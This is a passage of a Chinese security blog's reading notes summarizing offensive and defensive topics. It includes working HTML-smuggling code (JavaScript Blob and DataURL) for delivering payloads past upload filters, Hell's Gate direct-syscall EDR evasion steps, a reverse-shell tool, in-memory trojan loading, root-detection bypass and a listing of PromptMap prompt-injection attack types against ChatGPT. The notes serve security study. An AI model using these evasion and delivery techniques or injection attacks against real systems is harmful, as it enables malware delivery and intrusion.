<h4 id="走私方式1：Javascript-Blob"><a href="#走私方式1：Javascript-Blob" class="headerlink" title="走私方式1：Javascript Blob"></a>走私方式1：Javascript Blob</h4><p>&emsp;Blob对象表示一个不可变、原始数据的类文件对象。它的数据可以按照文本或二进制的格式进行读取，也可以转换为ReadableStream来读取。借助Blob，我们可以将我们的恶意文件存储在HTML代码中，然后将其置入浏览器中，而不是直接向Web服务器发送文件上传请求。</p>
<p>（1）借助powershell，将文件转为base64：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))</span><br></pre></td></tr></table></figure>
<p>（2）替换html文件中<code>base64_encoded_file</code>与<code>fileName</code>所指的值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> fileName = xxx</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> base64_encoded_file = xxx</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">_base64ToArrayBuffer</span>(<span class="params">base64, mimeType</span>) &#123; </span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 解码 base64 数据</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> binary_string =  <span class="variable language_">window</span>.<span class="title function_">atob</span>(base64); </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> len = binary_string.<span class="property">length</span>; </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(len); </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++)&#123; </span></span><br><span class="line"><span class="language-javascript">                    bytes[i] = binary_string.<span class="title function_">charCodeAt</span>(i); </span></span><br><span class="line"><span class="language-javascript">                &#125; </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(<span class="keyword">new</span> <span class="title class_">Blob</span>([bytes], &#123;<span class="attr">type</span>: mimeType&#125;)) </span></span><br><span class="line"><span class="language-javascript">            &#125; </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> url = <span class="title function_">_base64ToArrayBuffer</span>(base64_encoded_file,<span class="string">&#x27;octet/stream&#x27;</span>) </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> link = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>); </span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(link); </span></span><br><span class="line"><span class="language-javascript">            link.<span class="property">href</span> = url; </span></span><br><span class="line"><span class="language-javascript">            link.<span class="property">download</span> = fileName; </span></span><br><span class="line"><span class="language-javascript">            link.<span class="property">innerText</span> = <span class="string">&#x27;Download&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;只要点击上面的链接，就会开始下载。</p>
<h4 id="走私方式2：DataURL"><a href="#走私方式2：DataURL" class="headerlink" title="走私方式2：DataURL"></a>走私方式2：DataURL</h4><p>&emsp;将<strong>较小的文件（65535字节）</strong>嵌入HTML文件中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    	&lt;!--</span><br><span class="line">            data   : 前缀</span><br><span class="line">            text   : MIME 类型的字符串，表示 text 类型</span><br><span class="line">            base64 : base64 编码</span><br><span class="line">    	--&gt;</span><br><span class="line">        &lt;a href=&quot;data:text/x-powershell;base64,aXBjb25maWcNCmhvc3RuYW1l&quot; </span><br><span class="line">            download=&quot;test.ps1&quot;&gt;</span><br><span class="line">            Download</span><br><span class="line">        &lt;/a&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="HTMLSmuggler-工具"><a href="#HTMLSmuggler-工具" class="headerlink" title="HTMLSmuggler 工具"></a>HTMLSmuggler 工具</h3><p>&emsp;文章<a target="_blank" rel="noopener" href="https://securityonline.info/htmlsmuggler-js-payload-generator-for-ids-bypass-and-payload-delivery-via-html-smuggling/">链接</a>。目标是创建一个 javascript 库，其中潜入了用户定义的恶意代码，此库会集成到钓鱼网站中。创建的 javascript 库链接为：<a target="_blank" rel="noopener" href="https://github.com/D00Movenok/HTMLSmuggler/blob/main/examples/html/payload.umd.js">链接</a>。</p>
<p>&emsp;此库的特点为：</p>
<p>（1）内置 JavaScript 模糊处理程序，可完全隐藏负载。</p>
<p>（2）既可以作为独立的 JS 库使用，也可以嵌入 React、Vue.JS 等 JS 框架中。</p>
<p>（3）允许添加额外的数据处理程序/压缩/模糊处理。</p>
<h2 id="Prompt-Injection-for-chatGPT-PromptMap"><a href="#Prompt-Injection-for-chatGPT-PromptMap" class="headerlink" title="Prompt Injection for chatGPT: PromptMap"></a>Prompt Injection for chatGPT: PromptMap</h2><p>&emsp;PromptMap 通过了解在 ChatGPT 上配置规则的上下文来自动测试 Prompt 注入。项目链接：<a target="_blank" rel="noopener" href="https://github.com/utkusen/promptmap/blob/main/promptmap.py">链接</a>。工作原理：</p>
<p><img src="/images/news-and-good-article/image-20230923233900829.png" alt="image-20230923233900829" style="zoom:67%;" /></p>
<p>&emsp;攻击类型：</p>
<p>（1）没有 Prompt 增强的情况下的注入，目的是不相关的答案或操作。</p>
<p>（2）翻译注入：向 ChatGPT 提供不受语言限制的英语 Prompt，以判断它是否以另一种语言响应。</p>
<p>（3）数学注入：让 ChatGPT 求解数学方程表明其完成复杂任务的能力。</p>
<p>（4）上下文切换：询问不相关的问题来衡量 ChatGPT 回答特定目标的敏感查询的意愿。</p>
<p>（5）外部浏览：允许 ChatGPT 浏览特定的 URL。</p>
<p>（6）外部 Prompt 注入：询问 ChatGPT 是否可以访问特定 URL 以获得其他提示。</p>
<h2 id="Fault-Injection-Reference-Model-FIRM"><a href="#Fault-Injection-Reference-Model-FIRM" class="headerlink" title="Fault Injection Reference Model (FIRM)"></a>Fault Injection Reference Model (FIRM)</h2><p>&emsp;故障注入原理模型（FIRM），<a target="_blank" rel="noopener" href="https://raelize.com/blog/raelize-fi-reference-model/">链接</a>。</p>
<p>&emsp;厂家都不想让用户直接访问产品的底层，知晓产品的底层原理，而是想让他们无脑使用产品即可。相关的，厂家设计了很多安全保护措施，来保护产品底层，例如Secure Boot。</p>
<p>&emsp;然而，黑客使用故障注入（FI），可以成功的攻击各种产品（例如PS5），从而实现代码执行、提权、提取密钥等。<code>FI是一种绕过Secure Boot与提权的有效技术，即使用专门的工具在特定时刻将故障注入产品中</code>。</p>
<h3 id="FI漏洞"><a href="#FI漏洞" class="headerlink" title="FI漏洞"></a>FI漏洞</h3><p>&emsp;FI漏洞是硬件系统对输入的敏感性，例如使用电压毛刺绕过Secure Boot。有时候触发FI漏洞不是全都需要专门的工具，使用软件也可以触发。</p>
<h3 id="FI攻击"><a href="#FI攻击" class="headerlink" title="FI攻击"></a>FI攻击</h3><p>&emsp;FI攻击并不简单，当攻击目标很复杂时，攻击变量的细微差别很重要，包括毛刺的定时、毛刺的形状、毛刺的影响、目标的状态等。通过FIRM，可以在概念上分解FI攻击，有助于我们更好的理解FI攻击。</p>
<h3 id="FIRM描述"><a href="#FIRM描述" class="headerlink" title="FIRM描述"></a>FIRM描述</h3><p>&emsp;FI攻击的六个阶段： Activate、Inject、Glitch、Fault、Exploit、Goal。</p>
<p>&emsp;其中Activate、Inject、Glitch是触发FI漏洞所需的条件。Activate指需要使用的FI技术，Inject指这些FI技术都能起到什么作用，Glitch代表对FI漏洞的毛刺进行整形的参数。</p>
<p>&emsp;Fault、Exploit、Goal指FI漏洞被触发后可以做的事。Fault代表由于FI漏洞而引入的故障类型，Exploit描述攻击者如何利用给定的故障来实现特定的目标，Goal代表攻击者最后可以达到的目标。如下所示：</p>
<p><img src="/images/news-and-good-article/raelize-fi-fault-model-rowhammer.png" alt="img" style="zoom:67%;" /></p>
<p>&emsp;FIRM还可以指导防御措施，如下所示：</p>
<p><img src="/images/news-and-good-article/raelize-fi-fault-model-countermeasures.png" alt="img" style="zoom:67%;" /></p>
<h2 id="使用-Rust-进行模糊测试开发"><a href="#使用-Rust-进行模糊测试开发" class="headerlink" title="使用 Rust 进行模糊测试开发"></a>使用 Rust 进行模糊测试开发</h2><p><a target="_blank" rel="noopener" href="https://github.com/raminfp/fuzzer-development-with-rust">https://github.com/raminfp/fuzzer-development-with-rust</a></p>
<p>Hint 一下，有空学习。</p>
<h2 id="CVE-2023-4809：FreeBSD-pf-绕过"><a href="#CVE-2023-4809：FreeBSD-pf-绕过" class="headerlink" title="CVE-2023-4809：FreeBSD pf 绕过"></a>CVE-2023-4809：FreeBSD pf 绕过</h2><p><a target="_blank" rel="noopener" href="https://seclists.org/oss-sec/2023/q3/168">https://seclists.org/oss-sec/2023/q3/168</a></p>
<p>&emsp;OpenBSD Packet Filter(PF) 是一款自 OpenBSD 移植来的防火墙，提供了大量功能。它还有两种防火墙，分别为 ipfw 与 ipfilter。当两个通信的数据包大于 MTU（最大传输单元）时，IPv4/6 通常会对数据包进行分段。</p>
<p>&emsp;IPv6 分段是通过将 IPv6 分组的有效载荷分成多个片段来实现的：每个片段包含分组标识符（给定分组的所有片段都相同）、片段偏移量、下一个报头类型、指示片段是否是最后一个的标志。IPv6 片段的一种特殊类型是<code>原子片段</code>，即数据包仅使用一个片段进行分段，分段传输仅由唯一的片段组成。</p>
<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>&emsp;使用 pf 作为 IPv6 流量的防火墙并启用 scrub 来重组 IPv6 碎片的 FreeBSD 容易受到利用 IPv6 碎片绕过规则的攻击。例如，有如下规则：<code>attacker 主机发出的所有 TCP、UDP、ICMPv6 流量都被过滤，其他则放行（规则1），对于碎片化的流量，重组后再进行检查（规则2）。</code></p>
<p>&emsp;那么，attacker 发送 IPv6 原子片段，其中放了好多 IPv6 片段头。pf 进行数据包重组，但是不会匹配<code>规则1</code>，因此此数据包被通过。此外，重组过程修复了数据包，因此防火墙后的操作系统可以接收改数据包。</p>
<h2 id="EDR-bypass-地狱之门"><a href="#EDR-bypass-地狱之门" class="headerlink" title="EDR bypass-地狱之门"></a>EDR bypass-地狱之门</h2><p><a target="_blank" rel="noopener" href="https://labs.en1gma.co/malwaredevelopment/evasion/security/2023/08/14/syscalls.html">https://labs.en1gma.co/malwaredevelopment/evasion/security/2023/08/14/syscalls.html</a></p>
<p>&emsp;地狱之门：<a target="_blank" rel="noopener" href="https://github.com/JetP1ane/Artemis">动态系统调用 ID 提取器</a>。</p>
<p>&emsp;系统调用为用户进程访问需要提升特权的系统功能提供了一种方式。如下所示：</p>
<p><img src="/images/news-and-good-article/image-20231102203554068.png" alt="image-20231102203554068" style="zoom:67%;" /></p>
<p>&emsp;windows只有 ring 0（内核模式）、ring3（用户模式）。很多EDR产品会在 windows API 设置钩子，从而检测是否有病毒软件，通过系统调用，我们不调用 windows api了，直接 syscall（系统调用并不提供内核级的特权，而是本质上允许从用户模式到内核模式的临时转换）。</p>
<h3 id="什么是地狱之门？"><a href="#什么是地狱之门？" class="headerlink" title="什么是地狱之门？"></a>什么是地狱之门？</h3><p>&emsp;地狱之门是一种<code>在64位Windows进程的上下文中动态提取syscall id的技术</code>。由于syscall id在Windows的每个版本中都不一致，地狱之门通过从运行时加载到进程中的ntdll.dll模块中动态提取syscall id来解决不一致问题。其具体流程为：</p>
<p>（1）在进程内存中，通过遍历模块基址的PEB来识别ntdll.dll。</p>
<p>（2）遍历进程内存中的ntdll.dll PE(可移植可执行文件)结构，以找到导出地址表。</p>
<p>（3）找到目标函数并遍历函数的机器码直到找到egg（标识syscall指令的汇编组），遍历结束。</p>
<h3 id="地狱之门实现"><a href="#地狱之门实现" class="headerlink" title="地狱之门实现"></a>地狱之门实现</h3><p>（1）首先，我们不依赖 windows api 找到 PEB。PEB 包含与进程的执行环境相关的数据，如命令行参数、环境变量、加载的模块和安全设置，其具体结构见<a target="_blank" rel="noopener" href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm">链接</a>。那具体怎么找呢？</p>
<p>&emsp;&emsp;（a）TEB（线程环境块）包含PEB地址。而在x86_64上，GS CPU寄存器存储指向 TEB 的基址，以TEB为基底，PEB的指针位于TEB+0x60。并且，C++有函数<code>__readgsqword</code>，它将读取GS寄存器，并以偏移值作为参数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UINT64* pebPtr = (UINT64*)__readgsqword(0x60);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;（b）在 PEB 中，有指针 LDR_DATA（pebPtr+0x18），它包含了加载的模块列表的位置，根据它，可以找到 ntdll.dll 模块在的内存结构中的位置。LDR_DATA 指向 3 个不同的列表，我们使用<code>InLoadOrderModuleList</code>（模块在启动时加载到流程中的顺序列出模块），其位置在 LDR_DATA+0x10。</p>
<p>&emsp;&emsp;（c）最终，可以找到 ntdll.dll，并保存模块的基址。</p>
<p>（2）遍历 ntdll.dll，提取 syscall id。</p>
<p>&emsp;&emsp;找到硬盘中的 ntdll.dll，并通过工具找到 AddressOfFunctions 与 AddressOfNames 的地址，遍历循环它们，来连接函数名与函数实际位置。</p>
<p>&emsp;之后，就要找到嵌入在函数程序中的syscall id，每个函数的前4个字节都是一样的，第5个字节不一样，它就是syscall id。之后，通过调用syscall id来进行系统调用。</p>
<h2 id="CVE-2023-4039：gcc-栈溢出保护绕过"><a href="#CVE-2023-4039：gcc-栈溢出保护绕过" class="headerlink" title="CVE-2023-4039：gcc 栈溢出保护绕过"></a>CVE-2023-4039：gcc 栈溢出保护绕过</h2><p><a target="_blank" rel="noopener" href="https://rtx.meta.security/mitigation/2023/09/12/CVE-2023-4039.html">https://rtx.meta.security/mitigation/2023/09/12/CVE-2023-4039.html</a></p>
<p>&emsp;堆栈溢出保护是，在堆栈的开始放入随机数，如果函数结束后发现随机数更改，则判定系统出错。aarch64的可变长度数组放置的地点是有缺陷的，可以简单的绕过堆栈溢出保护。</p>
<h2 id="HTTP-Shell-MultiPlatform-HTTP-Reverse-Shell"><a href="#HTTP-Shell-MultiPlatform-HTTP-Reverse-Shell" class="headerlink" title="HTTP-Shell - MultiPlatform HTTP Reverse Shell"></a>HTTP-Shell - MultiPlatform HTTP Reverse Shell</h2><p><a target="_blank" rel="noopener" href="http://dlvr.it/Svvm7B">http://dlvr.it/Svvm7B</a></p>
<p>&emsp;HTTP Shell是多平台反向Shell。与其他反向shell不同，该工具的主要目标是将其与Microsoft开发人员隧道结合使用，以便获得尽可能接近合法连接的连接。</p>
<h2 id="恶意软件检测的内存分析器"><a href="#恶意软件检测的内存分析器" class="headerlink" title="恶意软件检测的内存分析器"></a>恶意软件检测的内存分析器</h2><p>&emsp;YAMA是一个生成扫描程序的系统，可以在事件响应期间检查特定的恶意软件，旨在探索Windows操作系统的内存并检测恶意软件。基于YAMA的内存分析器可以检测内存马。<br><a target="_blank" rel="noopener" href="https://securityonline.info/yama-yet-another-memory-analyzer-for-malware-detection/">https://securityonline.info/yama-yet-another-memory-analyzer-for-malware-detection/</a></p>
<h2 id="Web应用程序安全测试自动化工具"><a href="#Web应用程序安全测试自动化工具" class="headerlink" title="Web应用程序安全测试自动化工具"></a>Web应用程序安全测试自动化工具</h2><p>&emsp;<code>NucleiFuzzer=ParamSpider+Nuclei</code>。ParamSpider用来识别source，并以Nuclei为模板扫描漏洞。<br><a target="_blank" rel="noopener" href="http://www.kitploit.com/2023/09/nucleifuzzer-powerful-automation-tool.html">http://www.kitploit.com/2023/09/nucleifuzzer-powerful-automation-tool.html</a></p>
<h2 id="donut-decryptor"><a href="#donut-decryptor" class="headerlink" title="donut_decryptor"></a>donut_decryptor</h2><p>&emsp;Donut 是一种与位置无关的代码，可以在内存中执行 VBScript、JScript、EXE、DLL、.NET。 Donut 创建的模块可以从 HTTP 服务器暂存，也可以直接嵌入到加载器本身中。 该模块可选择使用 Chaskey 分组密码和 128 位随机生成的密钥进行加密。 文件在内存中加载并执行后，原始引用将被删除以阻止内存扫描。 </p>
<p><a target="_blank" rel="noopener" href="https://github.com/TheWover/donut">https://github.com/TheWover/donut</a></p>
<p>&emsp;为了破解Donut，有工具被研发出来。donut-decryptor 检查文件中是否有 donut 的加载器 shellcode 的已知签名。 如果找到，它将解析 shellcode 以定位、解密和提取嵌入在二进制文件中的 DONUT_INSTANCE 结构，并报告相关的配置数据。 如果二进制文件中存在 DONUT_MODULE，则会将其解密并转储到磁盘。</p>
<p><a target="_blank" rel="noopener" href="http://github.com/volexity/donut-decryptor">http://github.com/volexity/donut-decryptor</a></p>
<h2 id="反编译原理控制流分析"><a href="#反编译原理控制流分析" class="headerlink" title="反编译原理控制流分析"></a>反编译原理控制流分析</h2><p>&emsp;流图可以通过一些规则进行归约，归约到一个点。但是有一些流图不可归约，例如有多入口、出口的循环，这一般是由编译器优化而成的。ida在进行反编译时，需要对流图进行归约。为了对不可归约的流图进行处理，所以会插入goto语句。</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/swnTxas1wYWhaMgcq4fv-A">https://mp.weixin.qq.com/s/swnTxas1wYWhaMgcq4fv-A</a></p>
<h2 id="高级-root-检测和绕过技术"><a href="#高级-root-检测和绕过技术" class="headerlink" title="高级 root 检测和绕过技术"></a>高级 root 检测和绕过技术</h2><p>&emsp;分析流程见下文。总结一下，root检测的方法有，如果检测函数是native的，那么：</p>
<p>（1）检查系统是否有<code>system/bin/su</code>路径，如果有则返回假路径（通过勾取access方法）。</p>
<p>（2）访问<code>/selinux</code>查看访问权限，返回其他文件（勾取stat）。</p>
<p>（3）访问<code>/proc/self/attr/prev</code>，查看文件内容。</p>
<p>（4）查看是否有magisk的路径，或者有些只读路径变成可写的。</p>
<p>（5）arm程序中的<code>svc 0x0</code>，用于进行系统调用，发现有些系统调用也会进行root检查（地狱之门）。</p>
<p><a target="_blank" rel="noopener" href="https://8ksec.io/advanced-root-detection-bypass-techniques/">https://8ksec.io/advanced-root-detection-bypass-techniques/</a></p>
<h2 id="HeaderLessPE"><a href="#HeaderLessPE" class="headerlink" title="HeaderLessPE"></a>HeaderLessPE</h2><p>&emsp;HeaderLessPE是Icedid木马使用的内存PE加载技术。相比MemDll等内存加载技术，扩展后的HeaderLessPE有两个优点：</p>
<ul>
<li>避免传统PE的DOS头、PE头特征。DOS头和PE头经常是被内存扫描的照顾重点特征，在使用Cobalt Strike的时候常需要设置Profile文件将加载完成的Beacon头抹掉，使用HeaderLessPE就不需要担心这个问题。</li>
<li>支持重定位和导入表，能方便的将EXE转换为HeaderLessPE结构。只要是支持重定位，不包含如：Tls、delay import等结构都能够转换为HeaderLessPE，这样不仅可以用来做木马内存模块，还可以将一些黑客工具方便的转换为HeaderLessPE进行内存加载运行，扩展可使用的攻击工具。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/M01N-Team/HeaderLessPE">https://github.com/M01N-Team/HeaderLessPE</a></p>
<h2 id="客户端-JavaScript-插桩"><a href="#客户端-JavaScript-插桩" class="headerlink" title="客户端 JavaScript 插桩"></a>客户端 JavaScript 插桩</h2><p><a target="_blank" rel="noopener" href="https://blog.doyensec.com//2023/09/25/clientside-javascript-instrumentation.html">https://blog.doyensec.com//2023/09/25/clientside-javascript-instrumentation.html</a></p>
<p>客户端 JavaScript 插桩：使用常见的浏览器功能（例如 XSS 接收器和 DOM 接收器）实现类似于 ltrace、strace 和 frida 的能力。</p>

  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2023/08/09/recentlyThink-3/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/08/02/tp-link-wr740-backdoor-vul/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>


	<!-- comment -->
	
<section id="comment">
    <h2 class="title">留言</h2>

    <!-- 
    <div id="disqus_thread" class="ds-thread">
        <script type="text/javascript">
            /**
             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
             */
                /*
                 var disqus_config = function () {
                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 };
                 */
            (function() { // DON'T EDIT BELOW THIS LINE
                var d = document, s = d.createElement('script');

                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';

                s.setAttribute('data-timestamp', +new Date());
                (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
                Disqus.</a></noscript>
    </div> -->
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
        })
    </script>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-08-05 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/papers/">papers<span>12</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%A5%BD%E6%96%87%E7%AB%A0%E7%9A%84%E7%AC%94%E8%AE%B0"><span class="toc-article-text">好文章的笔记</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#IT-and-OT-in-the-mix"><span class="toc-article-text">IT and OT in the mix</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#P2PInfect-Self-Replicating-Worm-Hits-Redis-Instances"><span class="toc-article-text">P2PInfect: Self-Replicating Worm Hits Redis Instances</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Securing-the-AI-Pipeline"><span class="toc-article-text">Securing the AI Pipeline</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#AI-Pipeline-model"><span class="toc-article-text">AI Pipeline model</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#AI-Pipeline-Threat-model"><span class="toc-article-text">AI Pipeline Threat model</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#10-weaknesses-about-AI-model"><span class="toc-article-text">10 weaknesses about AI model</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#open-appsec"><span class="toc-article-text">open-appsec</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ML-waf%E5%BA%94%E7%94%A8%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-article-text">ML waf应用的例子</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#open-appsec%E6%9E%B6%E6%9E%84"><span class="toc-article-text">open-appsec架构</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9ACartographer"><span class="toc-article-text">工具：Cartographer</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#APP%E5%A4%96%E5%A3%B3%E5%88%86%E6%9E%90"><span class="toc-article-text">APP外壳分析</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LLVM%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%A0%E5%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-article-text">LLVM字符串加密学习笔记</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2021%E5%B9%B4%E5%A4%A9%E5%BA%9C%E6%9D%AF%E9%92%88%E5%AF%B9%E7%BE%A4%E6%99%96-amp-%E5%8D%8E%E7%A1%95%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-article-text">2021年天府杯针对群晖&amp;华硕的利用</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%8F%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="toc-article-text">计算机硬件及操作系统原理介绍</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%8B%E6%B8%B8%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%8F%8Dhook%E5%88%86%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-article-text">手游反调试-反hook分析与绕过</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AE%89%E5%8D%93%E9%9D%99%E6%80%81%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86"><span class="toc-article-text">安卓静态数据加密原理</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E8%87%AA%E5%88%B6%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BB%93%E6%9E%84-%E2%80%93-SecTodayBot"><span class="toc-article-text">恶意软件所使用的自制可执行程序的结构 – SecTodayBot</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Hidden-Bee%E6%A0%BC%E5%BC%8F%EF%BC%9ANE%E4%B8%8ENS"><span class="toc-article-text">Hidden Bee格式：NE与NS</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NE"><span class="toc-article-text">NE</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NS"><span class="toc-article-text">NS</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Rhadamanthys%E5%88%86%E6%9E%90"><span class="toc-article-text">Rhadamanthys分析</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%9F%BA%E4%BA%8EVS-Code%E7%9A%84%E9%92%93%E9%B1%BC"><span class="toc-article-text">基于VS Code的钓鱼</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%84%9F%E6%9F%93%E8%BF%87%E7%A8%8B"><span class="toc-article-text">感染过程</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A5%BD%E7%9A%84linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-article-text">什么是好的linux内核漏洞？</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" 